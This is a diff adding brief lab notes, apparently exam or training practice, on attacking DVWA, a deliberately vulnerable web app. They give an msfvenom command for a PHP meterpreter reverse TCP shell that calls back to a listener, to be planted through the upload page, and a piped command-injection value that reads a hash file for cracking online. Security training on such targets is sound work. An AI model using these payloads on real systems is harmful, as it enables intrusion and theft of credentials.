@@ -1,0 +1,17 @@
+http://172.16.0.27:8080/DVWA
+
+First Method:
+Creating reverse TCP
+service postgresql start
+msvenom -p php/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f raw
+Copy the raw and create a file upload.php and upload in DVWA web site
+
+msfconsole
+use exploit
+
+
+Second Method:
+Go to Command Injection after login to DVWA website by keeping the Security as Low.
+Enter this command |type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
+This will show the hash, copy that hash and open https://hashes.com/en/decrypt/hash
+website in another tab and paste to get the decrypted content
